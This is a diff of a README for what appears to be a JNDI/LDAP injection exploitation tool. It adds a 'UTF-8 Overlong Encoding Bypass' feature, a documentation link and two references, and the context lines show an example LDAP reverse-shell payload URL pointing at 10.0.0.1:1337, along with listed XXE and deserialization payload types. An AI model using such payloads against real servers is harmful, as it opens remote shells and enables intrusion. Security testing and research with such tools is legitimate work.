@@ -46,6 +46,7 @@ ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
   - Tomcat Blind XXE
 - LDAP Deserialization (including common gadgets)
 - Customize payload based on Nashorn JS engine
+- UTF-8 Overlong Encoding Bypass
 
 ## 📖 Documentation
 
@@ -80,6 +81,7 @@ ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
   - [Use Reference Only](USAGE.en.md#use-reference-only)
   - [Confusing Class Name](USAGE.md#confusing-class-name)
   - [JShell Payload](USAGE.en.md#jshell-payload)
+  - [UTF-8 Overlong Encoding](USAGE.en.md#utf-8-overlong-encoding)
 
 ## ⚙️ Compile
 
@@ -117,6 +119,10 @@ mvn package -Dmaven.test.skip=true
 [https://yzddmr6.com/posts/swinglazyvalue-in-webshell/](https://yzddmr6.com/posts/swinglazyvalue-in-webshell/)
 
 [https://mogwailabs.de/en/blog/2024/12/jndi-mind-tricks/](https://mogwailabs.de/en/blog/2024/12/jndi-mind-tricks/)
+
+[https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html](https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html)
+
+[https://github.com/Whoopsunix/utf-8-overlong-encoding](https://github.com/Whoopsunix/utf-8-overlong-encoding)
 
 ## 🌟 Star History
 
